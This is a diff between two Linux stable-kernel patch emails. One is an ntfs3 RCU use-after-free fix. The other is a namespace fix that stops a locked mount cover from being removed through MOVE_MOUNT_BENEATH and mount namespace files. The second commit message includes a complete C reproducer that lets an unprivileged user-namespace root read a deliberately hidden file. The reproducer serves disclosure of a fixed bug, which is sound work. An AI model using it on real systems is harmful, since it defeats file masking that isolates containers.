@@ -1,50 +1,51 @@
 Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1792774668;
-	b=2XyWsvNqK7fl3KTWpVP4dTD+p01mHHrYa9clVd99WGKXvJDi1fmCVXltUUQ27f4RJ3TU
-	 wKsKugh+gJsew0AjrLfn7t1ralieknqaVIN+18zqKJL2iOXBa0cEKH3Ty5jgEpKKos47r
-	 MVQF5HSCM+IExunGWqHbxAVmNML3gQu4LEa08ktqf1lSu6Rn3D1LL4zy2GLkZEINWBAAv
-	 8lOsj5KNnsG6UPvvcgf1sUU4VLeo5b2vNSy69vfBeMCKSsqYBepfn27jH1LOlICawS2lm
-	 GplmYMvsH5qUW1uSp/bwje07O52QmLOLSyQbbVFhNoNYo2zSR+nadP8gInMhF/O2hvw==
+	t=1792774671;
+	b=uAXJC/fCr2PVSBTCJoJwIZmESEfQP2TM2UuDfgiR08bpGJMytX8w3ebfJmzJI2dSFw5g
+	 1NYh4+W+cgf6KRaEIrQcwnfUfXA56enKfsxImDLXEKeQpOfsPjbMbv+zm4BZP2sK9M3+2
+	 F9C/cwxVctv4Q4e4pnHdhmLWiuJ8cLTJ1mjXHnv3OjV5hu1UCOpf24z0dcN6c/NyeC/Ym
+	 GdNGeMkF5LvlwikUgM+buCeShP7Jkpg/tDrSeB2/nR8DN7SLXpQauqbSKJ5cafHheMHA8
+	 TDFAUvjEi/rA9ONXsMYl4aXiNOkBrX5gqHh76sTjLDMzSv1ERD8N8kiW2tJfoYsVlYw==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1792774668;
+	a=rsa-sha256; c=relaxed/relaxed; t=1792774671;
 	h=Received:DKIM-Signature:From:To:Cc:Subject:Date:Message-ID:X-Mailer:
 	 In-Reply-To:References:User-Agent:X-stable:X-Patchwork-Hint:
 	 MIME-Version:Content-Transfer-Encoding;
-	bh=A0ZY5Lpqig3khWNP9Shz75LZ3KxWMjQmhlYJ1qHPLtk=;
-	b=Yr2IauF2xRLWna2Q8X1wlh32xwY+xAm/Easlw+mD7ZWd+npkbZ2IpTnFAPbHIaW/75FQ
-	 7R8WwgEul5srCa9KjUyrngURSmaq2IRfRWt/Tn28JyWjlxt42TyeHhVuqdsO8extazMCv
-	 SkydLwfqumWxnRkjEIKNVKw6SeR+0mkWsHNtJe7SNEoCddMHY8dycscA8UkYpeq6EgudO
-	 BDQk1w71vm9XNRO3aQmkVrCEeEGJW4eaxz2kvWExSWDgipmWXzXjzU0dQXZr45w6sp/kD
-	 DzycJ6P/mF0m/8Zu2g7bkPLfqW43bwPwrqIMZWBzG6mbX00vQADErO2TzZ6RJx6Fh9g==
+	bh=FxdN9TBRrUxtD7T/ICefFifyQJI2WPnC4jhm21El8MU=;
+	b=WRMSIsXZV6BayMOEG5bZB7N+jckssxrl8Y6G23xC2zWsd6I6E1RPeQHRHC+SAeBKYSaA
+	 H5ufp0C8zhYOdebmHkHhsMldzvagUDw7DvsKNjlNqJmZYc5cyVGLxwal1Uk32HViJvHYm
+	 GXjw0+XTLp59xPqZ90UGep5geVgjpj7Jwu6Mp/D5D7rlzigFQPtStC0vvW9TxYhOqeXJ5
+	 UepzTSInC9fBuqmS2N+OHB/XfJ26KM0DhKwHC2c97YdNRHfN/3/ax+ffiKU96k0d6qvit
+	 Re85mUbApol4IYhFeCnGbWTYGMZ3n/WNL+BpYXlYFLdI5d52LruDTWMLhSYCVE49SSg==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dkim=pass header.d=linuxfoundation.org header.i=@linuxfoundation.org header.a=rsa-sha256 header.s=korg header.b=tsPzol3b;
+	dkim=pass header.d=linuxfoundation.org header.i=@linuxfoundation.org header.a=rsa-sha256 header.s=korg header.b=hX4KMjKw;
 	arc=none smtp.remote-ip=100.103.45.18
 Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 072DF606A31A;
-	Fri, 23 Oct 2026 16:57:48 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E1275606A31A;
+	Fri, 23 Oct 2026 16:57:50 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key, unprotected) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.a=rsa-sha256 header.s=korg header.b=tsPzol3b
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 55B501F01825;
-	Fri, 23 Oct 2026 16:57:47 +0000 (UTC)
+	dkim=pass (1024-bit key, unprotected) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.a=rsa-sha256 header.s=korg header.b=hX4KMjKw
+Received: by smtp.kernel.org (Postfix) with ESMTPSA id 38E3C1F01825;
+	Fri, 23 Oct 2026 16:57:50 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=linuxfoundation.org;
-	s=korg; t=1792774667;
-	bh=A0ZY5Lpqig3khWNP9Shz75LZ3KxWMjQmhlYJ1qHPLtk=;
+	s=korg; t=1792774670;
+	bh=FxdN9TBRrUxtD7T/ICefFifyQJI2WPnC4jhm21El8MU=;
 	h=From:To:Cc:Subject:Date:In-Reply-To:References;
-	b=tsPzol3bPj8OPb11CW6vrgq6c4JnyMIgLhZjmbri9JfzWs6hQxy5bz8z1aMBs/GO6
-	 XV8C+WDayxyTsT/suMVIR3C4o/UpWEfPf7/9Cup8f3dDCS8RLodYybQqzOur1DIyAl
-	 YzqFJMgu3NYTi6ZmwtqC7k8iNCKZyW2cXbGsuUKg=
+	b=hX4KMjKwuwIqxByJ1VadjtPu9W0fe2NSztS2jtQxnI21z16Fmy+93rNPJjxR46bxg
+	 3IFuOim6cfW/S3g2YDmSdDPOYH4XX7d4+c0tCPLPEscJwcA+oFYhlFJ2r7Rsrxx59n
+	 gzTUnVkRvQjuma6W2kOqdA0TUv/sgvQ/MPQer+bM=
 From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 To: stable@vger.kernel.org
 Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
 	patches@lists.linux.dev,
+	Chris Mason <mason@kernel.org>,
 	"Christian Brauner (Amutable)" <brauner@kernel.org>
-Subject: [PATCH 7.2 117/242] ntfs3: free the sbi after a grace period
-Date: Fri, 23 Oct 2026 18:39:19 +0200
-Message-ID: <20261023163716.546499305@linuxfoundation.org>
+Subject: [PATCH 7.2 118/242] namespace: a mount that copy_tree() leaves out cant take over a lock
+Date: Fri, 23 Oct 2026 18:39:20 +0200
+Message-ID: <20261023163716.571886183@linuxfoundation.org>
 X-Mailer: git-send-email 2.56.0
 In-Reply-To: <20261023163713.816071858@linuxfoundation.org>
 References: <20261023163713.816071858@linuxfoundation.org>
@@ -68,156 +69,338 @@ Content-Transfer-Encoding: 8bit
 
 From: Christian Brauner <brauner@kernel.org>
 
-commit c01b091b06412d3b1b53d8c2925f6de586c8a2fc upstream.
+commit 69fbe94f80bc423613fa18dae6656757423732a2 upstream.
 
-If the "nocase" mount option ntfs3 uses custom hash and dentry compare
-functions. Both access ntfs3 superblock private information in rcu
-pathwalk. ntfs_put_super() and ntfs3_kill_sb() drop the info without any
-rcu delay. A lookup that's still inside the filesystem when the last
-reference to the mount is dropped causes a UAF. With a pathwalk held up
-in ntfs_d_hash() while the last reference to the mount goes away:
+Since commit c62a4766937e ("move_mount: transfer MNT_LOCKED") a mount
+can be moved beneath a locked mount. The lock moves from the old cover
+to the new mount which takes over the job of hiding what's under it and
+the old cover can be unmounted. That works as long as the new mount
+stays. But the caller picks the new mount and copy_tree() leaves a
+mount of a mount namespace file out of every copy made without
+CL_COPY_MNT_NS_FILE, together with everything mounted on it, and never
+looks at MNT_LOCKED. unshare(CLONE_NEWNS) and mount propagation make
+such copies.
 
-  BUG: KASAN: slab-use-after-free in ntfs_nls_to_utf16+0x752/0x940
-  Read of size 8 at addr ff1100010453c850 by task walker/99
-  Call Trace:
-   <TASK>
-   ntfs_nls_to_utf16+0x752/0x940
-   ntfs_d_hash+0x22b/0x500
-   link_path_walk+0x11ad/0x1d30
-   path_lookupat+0x63/0xb00
-   filename_lookup+0x1f1/0x5b0
-   vfs_statx+0xd7/0x3b0
-  [...]
-  Allocated by task 95:
-   __kmalloc_cache_noprof+0x249/0x560
-   ntfs_init_fs_context+0x2db/0x5a0
-   alloc_fs_context+0x52e/0xc70
-  [...]
-  Freed by task 98:
-   kfree+0x1db/0x5b0
-   deactivate_locked_super+0x9c/0xf0
-   cleanup_mnt+0x9f/0x130
-   task_work_run+0x131/0x250
+So a task that is root in its own user namespace gets rid of a locked
+cover on a file without a race and without touching the filesystem
+below it. It makes a child with a mount namespace of its own, binds the
+child's /proc/<pid>/ns/mnt beneath the cover with MOVE_MOUNT_BENEATH,
+which hands the lock to that bind, and calls unshare(CLONE_NEWNS). The
+new mount namespace has nothing on the file. That's the usual way to
+mask a single file, a bind of /dev/null or of an empty file. With a
+bind of an ordinary file the file stays covered.
 
-The bug is currently masked by the grace period in namespace_unlock()
-for umount(2). Keep the necessary information until the filesystem
-private info is freed and free it with an rcu delay.
+copy_tree() already refuses to leave out a locked unbindable mount with
+-EPERM since commit df7342b24018 ("mount: Don't allow copying
+MNT_UNBINDABLE|MNT_LOCKED mounts"). Do the same for a locked mount of a
+mount namespace file. That also covers a tree copied with
+CL_COPY_MNT_NS_FILE and attached into a mount namespace of another user
+namespace where lock_mnt_tree() locks it. Note that unshare(CLONE_NEWNS)
+and clone(CLONE_NEWNS) fail with EPERM from such a mount namespace from
+then on. The mount can't be left out and it can't be unmounted.
 
-ntfs3_free_sbi() now runs from an rcu callback and drops the upcase
-table via ntfs_put_shared(). So switch s_shared_lock over to
-spin_lock_bh(). Otherwise the callback can deadlock against a task
-holding the lock on the same cpu.
+And refuse to move a mount of a mount namespace file beneath a locked
+mount in the first place. Otherwise the task ends up with a mount it
+can't unmount and an unshare() that fails for good.
 
-Fixes: a3a956c78efa ("fs/ntfs3: Add option "nocase"")
-Cc: stable@vger.kernel.org
-Link: https://patch.msgid.link/20261009-work-fixes-rcu-v1-7-7446d2d335e6@kernel.org
+Chris also found a second mount that goes away by itself, a clone of an
+automounted mount that shrink_submounts() took along with its parent.
+Commit f78ddcc87224 ("namespace: never expire a locked mount") took
+care of that one.
+
+Chris's reproducer is appended. Mode nsfile reads SECRET after the
+unshare() on 7.3-rc7, with this patch the move_mount() fails with
+EINVAL and the file stays covered. nsfile-control uses an ordinary file
+and reads MASK both ways.
+
+  // SPDX-License-Identifier: GPL-2.0
+  /*
+   * Get rid of a locked cover with MOVE_MOUNT_BENEATH.
+   *
+   * The "admin" (root) makes a tmpfs W:
+   *     W/D         file, holds SECRET, covered by a bind of a file with MASK
+   *     W/Dd/inner  file, holds SECRET, Dd is covered by a bind of a directory
+   *                 whose "inner" holds MASK
+   *     W/own       directory of uid 1000 with the file "mine" and the
+   *                 directory "minedir", whose "inner" holds MINE
+   *     W/dbg       debugfs, mode 755. dbg/tracing is an automount point
+   * The "attacker" is uid 1000. It enters a new user namespace with a new mount
+   * namespace, so W and both covers are locked there.
+   *
+   * usage: prog MODE
+   *   plain      put a bind of own/mine beneath the cover of D, unmount the cover
+   *   nsfile     put a bind of the mount namespace file of a child beneath the
+   *              cover of D, then unshare(CLONE_NEWNS)
+   *   nsfile-control    the same with a bind of own/mine
+   *   shrink     put a bind of the automounted tracefs beneath the cover of Dd,
+   *              unmount the cover, put a tmpfs beneath W, call umount(W), which fails
+   *   shrink-control    the same with a bind of own/minedir
+   * The environment variable AUTOMOUNT_DIR names another automount point for "shrink".
+   */
+  #define _GNU_SOURCE
+  #include <errno.h>
+  #include <fcntl.h>
+  #include <grp.h>
+  #include <sched.h>
+  #include <signal.h>
+  #include <stdio.h>
+  #include <stdlib.h>
+  #include <string.h>
+  #include <unistd.h>
+  #include <sys/mount.h>
+  #include <sys/prctl.h>
+  #include <sys/stat.h>
+  #include <sys/wait.h>
+
+  #ifndef MOVE_MOUNT_BENEATH
+  #define MOVE_MOUNT_BENEATH 0x00000200
+  #endif
+  #define W "/run/x2"
+
+  static void die(const char *what)
+  {
+  	fprintf(stderr, "FATAL %s: %s\n", what, strerror(errno));
+  	exit(2);
+  }
+
+  static void put_file(const char *name, const char *content)
+  {
+  	int fd = open(name, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+
+  	if (fd < 0 || write(fd, content, strlen(content)) < 0)
+  		die(name);
+  	close(fd);
+  }
+
+  static void show(const char *path)
+  {
+  	char buf[32] = "";
+  	int fd = open(path, O_RDONLY);
+
+  	if (fd < 0) {
+  		printf("attacker: open(%s) = %s\n", path, strerror(errno));
+  		return;
+  	}
+  	if (read(fd, buf, sizeof(buf) - 1) < 0)
+  		snprintf(buf, sizeof(buf), "<%s>", strerror(errno));
+  	close(fd);
+  	printf("attacker: read(%s) = \"%s\"%s\n", path, buf,
+  	       strncmp(buf, "SECRET", 6) ? "" : "   <-- HIT");
+  }
+
+  static int say(const char *what, int ret)
+  {
+  	printf("attacker: %s: %s\n", what, ret ? strerror(errno) : "ok");
+  	return ret;
+  }
+
+  static void write_str(const char *path, const char *s)
+  {
+  	int fd = open(path, O_WRONLY);
+
+  	if (fd < 0 || write(fd, s, strlen(s)) < 0)
+  		die(path);
+  	close(fd);
+  }
+
+  static void mounts(void)
+  {
+  	if (system("grep x2 /proc/self/mountinfo"))
+  		printf("attacker: no mounts listed\n");
+  }
+
+  static void admin_setup(void)
+  {
+  	if (unshare(CLONE_NEWNS) || mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL))
+  		die("unshare");
+  	mkdir(W, 0755);
+  	if (mount("W", W, "tmpfs", 0, "mode=755"))
+  		die("mount W");
+  	if (mkdir(W "/Dd", 0755) || mkdir(W "/maskdir", 0755) || mkdir(W "/dbg", 0755) ||
+  	    mkdir(W "/own", 0755) || mkdir(W "/own/minedir", 0755))
+  		die("mkdir");
+  	put_file(W "/D", "SECRET");
+  	put_file(W "/Dd/inner", "SECRET");
+  	put_file(W "/mask", "MASK");
+  	put_file(W "/maskdir/inner", "MASK");
+  	put_file(W "/own/mine", "MINE");
+  	put_file(W "/own/minedir/inner", "MINE");
+  	if (mount(W "/mask", W "/D", NULL, MS_BIND, NULL) ||
+  	    mount(W "/maskdir", W "/Dd", NULL, MS_BIND, NULL))
+  		die("covers");
+  	if (mount("dbg", W "/dbg", "debugfs", 0, "mode=755"))
+  		die("mount debugfs");
+  }
+
+  static void become_attacker(void)
+  {
+  	if (setgroups(0, NULL) || setresgid(1000, 1000, 1000) ||
+  	    setresuid(1000, 1000, 1000) || prctl(PR_SET_DUMPABLE, 1))
+  		die("drop to uid 1000");
+  	if (unshare(CLONE_NEWUSER | CLONE_NEWNS))
+  		die("unshare user and mount namespace");
+  	write_str("/proc/self/setgroups", "deny");
+  	write_str("/proc/self/uid_map", "0 1000 1");
+  	write_str("/proc/self/gid_map", "0 1000 1");
+  }
+
+  /* clone the mount at @src and put the clone beneath the top mount at @where */
+  static int beneath(const char *src, const char *where)
+  {
+  	char what[128];
+  	int fd = open_tree(AT_FDCWD, src, OPEN_TREE_CLONE | OPEN_TREE_CLOEXEC);
+  	int ret;
+
+  	snprintf(what, sizeof(what), "open_tree(%s, OPEN_TREE_CLONE)", src);
+  	if (say(what, fd < 0))
+  		return -1;
+  	ret = move_mount(fd, "", AT_FDCWD, where,
+  			 MOVE_MOUNT_F_EMPTY_PATH | MOVE_MOUNT_BENEATH);
+  	snprintf(what, sizeof(what), "move_mount(clone, %s, MOVE_MOUNT_BENEATH)", where);
+  	say(what, ret);
+  	close(fd);
+  	return ret;
+  }
+
+  static void do_nsfile(int control)
+  {
+  	char path[64] = W "/own/mine";
+  	int pfd[2];
+  	pid_t pid;
+  	char c;
+
+  	if (pipe(pfd))
+  		die("pipe");
+  	pid = fork();
+  	if (pid < 0)
+  		die("fork");
+  	if (!pid) {
+  		if (unshare(CLONE_NEWNS) || write(pfd[1], "g", 1) != 1)
+  			die("child");
+  		pause();
+  		exit(0);
+  	}
+  	if (read(pfd[0], &c, 1) != 1)
+  		die("sync");
+  	if (!control)
+  		snprintf(path, sizeof(path), "/proc/%d/ns/mnt", pid);
+  	beneath(path, W "/D");
+  	mounts();
+  	say("unshare(CLONE_NEWNS)", unshare(CLONE_NEWNS));
+  	show(W "/D");
+  	mounts();
+  	kill(pid, SIGKILL);
+  	waitpid(pid, NULL, 0);
+  }
+
+  static void do_shrink(int control)
+  {
+  	const char *automount = getenv("AUTOMOUNT_DIR");
+  	int fd, mfd;
+
+  	if (!automount)
+  		automount = W "/dbg/tracing";
+  	beneath(control ? W "/own/minedir" : automount, W "/Dd");
+  	say("umount2(Dd, 0), the old cover", umount2(W "/Dd", 0));
+  	say("umount2(Dd, 0), the mount that was put beneath", umount2(W "/Dd", 0));
+  	show(W "/Dd/inner");
+  	say("umount2(W, 0)", umount2(W, 0));
+  	fd = fsopen("tmpfs", FSOPEN_CLOEXEC);
+  	if (fd < 0 || fsconfig(fd, FSCONFIG_CMD_CREATE, NULL, NULL, 0))
+  		die("fsopen tmpfs");
+  	mfd = fsmount(fd, FSMOUNT_CLOEXEC, 0);
+  	if (mfd < 0)
+  		die("fsmount");
+  	say("move_mount(new tmpfs, W, MOVE_MOUNT_BENEATH)",
+  	    move_mount(mfd, "", AT_FDCWD, W, MOVE_MOUNT_F_EMPTY_PATH | MOVE_MOUNT_BENEATH));
+  	close(mfd);
+  	mounts();
+  	say("umount2(W, 0)", umount2(W, 0));
+  	show(W "/Dd/inner");
+  	mounts();
+  }
+
+  int main(int argc, char **argv)
+  {
+  	const char *mode = argc > 1 ? argv[1] : "plain";
+
+  	setvbuf(stdout, NULL, _IOLBF, 0);
+  	admin_setup();
+  	become_attacker();
+
+  	show(W "/D");
+  	show(W "/Dd/inner");
+  	say("umount2(D, MNT_DETACH)", umount2(W "/D", MNT_DETACH));
+  	say("umount2(Dd, MNT_DETACH)", umount2(W "/Dd", MNT_DETACH));
+
+  	if (!strcmp(mode, "plain")) {
+  		beneath(W "/own/mine", W "/D");
+  		show(W "/D");
+  		say("umount2(D, MNT_DETACH), the old cover", umount2(W "/D", MNT_DETACH));
+  		show(W "/D");
+  		say("umount2(D, MNT_DETACH), the mount that was put beneath",
+  		    umount2(W "/D", MNT_DETACH));
+  		show(W "/D");
+  		mounts();
+  	} else if (!strncmp(mode, "nsfile", 6)) {
+  		do_nsfile(!strcmp(mode, "nsfile-control"));
+  	} else {
+  		do_shrink(!strcmp(mode, "shrink-control"));
+  	}
+  	return 0;
+  }
+
+Fixes: c62a4766937e ("move_mount: transfer MNT_LOCKED")
+Reported-by: Chris Mason <mason@kernel.org>
+Cc: stable@vger.kernel.org # v7.1+
+Link: https://patch.msgid.link/20261014-work-namei-locked-mnt_ns_file-v1-1-24035bd5d8e9@kernel.org
 Signed-off-by: Christian Brauner (Amutable) <brauner@kernel.org>
 Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
 ---
- fs/ntfs3/ntfs_fs.h |    1 +
- fs/ntfs3/super.c   |   33 +++++++++++++++++++++------------
- 2 files changed, 22 insertions(+), 12 deletions(-)
+ fs/namespace.c |   19 +++++++++++++++++--
+ 1 file changed, 17 insertions(+), 2 deletions(-)
 
---- a/fs/ntfs3/ntfs_fs.h
-+++ b/fs/ntfs3/ntfs_fs.h
-@@ -210,6 +210,7 @@ struct ntfs_index {
- /* Ntfs file system in-core superblock data. */
- struct ntfs_sb_info {
- 	struct super_block *sb;
-+	struct rcu_head rcu;
- 
- 	u32 discard_granularity;
- 	u64 discard_granularity_mask_inv; // ~(discard_granularity_mask_inv-1)
---- a/fs/ntfs3/super.c
-+++ b/fs/ntfs3/super.c
-@@ -195,7 +195,7 @@ void *ntfs_set_shared(void *ptr, u32 byt
- 	void *ret = NULL;
- 	int i, j = -1;
- 
--	spin_lock(&s_shared_lock);
-+	spin_lock_bh(&s_shared_lock);
- 	for (i = 0; i < ARRAY_SIZE(s_shared); i++) {
- 		if (!s_shared[i].cnt) {
- 			j = i;
-@@ -213,7 +213,7 @@ void *ntfs_set_shared(void *ptr, u32 byt
- 		s_shared[j].cnt = 1;
- 		ret = ptr;
- 	}
--	spin_unlock(&s_shared_lock);
-+	spin_unlock_bh(&s_shared_lock);
- 
- 	return ret;
- }
-@@ -230,7 +230,7 @@ void *ntfs_put_shared(void *ptr)
- 	void *ret = ptr;
- 	int i;
- 
--	spin_lock(&s_shared_lock);
-+	spin_lock_bh(&s_shared_lock);
- 	for (i = 0; i < ARRAY_SIZE(s_shared); i++) {
- 		if (s_shared[i].cnt && s_shared[i].ptr == ptr) {
- 			if (--s_shared[i].cnt)
-@@ -238,7 +238,7 @@ void *ntfs_put_shared(void *ptr)
- 			break;
- 		}
- 	}
--	spin_unlock(&s_shared_lock);
-+	spin_unlock_bh(&s_shared_lock);
- 
- 	return ret;
- }
-@@ -697,6 +697,8 @@ static noinline void ntfs3_put_sbi(struc
- 
- static void ntfs3_free_sbi(struct ntfs_sb_info *sbi)
+--- a/fs/namespace.c
++++ b/fs/namespace.c
+@@ -2221,6 +2221,11 @@ struct mount *copy_tree(struct mount *sr
+ 			}
+ 			if (!(flag & CL_COPY_MNT_NS_FILE) &&
+ 			    is_mnt_ns_file(src_mnt->mnt.mnt_root)) {
++				if (src_mnt->mnt.mnt_flags & MNT_LOCKED) {
++					/* Both a mount namespace file and locked. */
++					dst_mnt = ERR_PTR(-EPERM);
++					goto out;
++				}
+ 				src_mnt = skip_mnt_tree(src_mnt);
+ 				continue;
+ 			}
+@@ -3607,8 +3612,9 @@ static bool mount_is_ancestor(const stru
+  * @mnt_to:   mount under which to mount
+  * @mp:   mountpoint of @mnt_to
+  *
+- * - Make sure that the caller can unmount the topmost mount ensuring
+- *   that the caller could reveal the underlying mountpoint.
++ * - Make sure that @mnt_from can take over the lock of @mnt_to. A
++ *   mount of a mount namespace file is left out of a copy of the tree
++ *   and can't.
+  * - Ensure that nothing has been mounted on top of @mnt_from before we
+  *   grabbed @namespace_sem to avoid creating pointless shadow mounts.
+  * - Prevent mounting beneath a mount if the propagation relationship
+@@ -3624,6 +3630,15 @@ static int can_move_mount_beneath(const
  {
-+	if (sbi->options)
-+		put_mount_options(sbi->options);
- 	kfree(sbi->new_rec);
- 	kvfree(ntfs_put_shared(sbi->upcase));
- 	kvfree(sbi->def_table);
-@@ -708,6 +710,11 @@ static void ntfs3_free_sbi(struct ntfs_s
- 	kfree(sbi);
- }
+ 	struct mount *parent_mnt_to = mnt_to->mnt_parent;
  
-+static void ntfs3_free_sbi_rcu(struct rcu_head *head)
-+{
-+	ntfs3_free_sbi(container_of(head, struct ntfs_sb_info, rcu));
-+}
++	/*
++	 * @mnt_from takes over the lock of @mnt_to. copy_tree() leaves a
++	 * mount of a mount namespace file out of every copy made without
++	 * CL_COPY_MNT_NS_FILE, together with what is mounted on it, so it
++	 * can't keep anything hidden.
++	 */
++	if (IS_MNT_LOCKED(mnt_to) && is_mnt_ns_file(mnt_from->mnt.mnt_root))
++		return -EINVAL;
 +
- static void ntfs_put_super(struct super_block *sb)
- {
- 	struct ntfs_sb_info *sbi = sb->s_fs_info;
-@@ -717,11 +724,11 @@ static void ntfs_put_super(struct super_
- 	/* Mark rw ntfs as clear, if possible. */
- 	ntfs_set_state(sbi, NTFS_DIRTY_CLEAR);
- 
--	if (sbi->options) {
--		put_mount_options(sbi->options);
--		sbi->options = NULL;
--	}
--
-+	/*
-+	 * The mount options stay until the sbi is freed: ->d_hash() and
-+	 * ->d_compare() of a pathwalk in rcu mode read the nls table through
-+	 * them.
-+	 */
- 	ntfs3_put_sbi(sbi);
- }
- 
-@@ -1923,9 +1930,11 @@ static void ntfs3_kill_sb(struct super_b
- 
- 	kill_block_super(sb);
- 
--	if (sbi->options)
--		put_mount_options(sbi->options);
--	ntfs3_free_sbi(sbi);
-+	/*
-+	 * A pathwalk in rcu mode may still be in ->d_hash() or ->d_compare()
-+	 * and read the upcase table and the nls table through the sbi.
-+	 */
-+	call_rcu(&sbi->rcu, ntfs3_free_sbi_rcu);
- }
- 
- // clang-format off
+ 	/* Avoid creating shadow mounts during mount propagation. */
+ 	if (mnt_from->overmount)
+ 		return -EINVAL;
 
 
